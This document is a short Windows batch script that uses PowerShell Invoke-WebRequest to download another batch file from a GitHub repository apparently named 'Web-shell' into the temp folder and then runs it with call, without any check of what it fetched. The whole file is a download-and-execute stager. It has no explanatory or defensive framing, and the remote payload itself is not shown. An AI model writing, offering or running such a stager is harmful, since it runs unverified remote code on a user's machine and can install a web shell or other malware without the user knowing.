@echo off

REM URL of the .bat file to download
set "bat_url=https://github.com/un9nplayer/Web-shell/raw/main/new.bat"

REM Path where the downloaded .bat file will be saved
set "downloaded_bat=%TEMP%\downloaded_script.bat"

REM Download the .bat file using PowerShell
powershell -Command "& { Invoke-WebRequest '%bat_url%' -OutFile '%TEMP%\downloaded_script.bat' }"

REM Check if the download was successful
if not exist "%TEMP%\downloaded_script.bat" (
    echo Failed to download the script.
    pause
    exit /b
)

REM Execute the downloaded .bat file
call "%TEMP%\downloaded_script.bat"

REM Pause execution to keep the terminal window open
pause
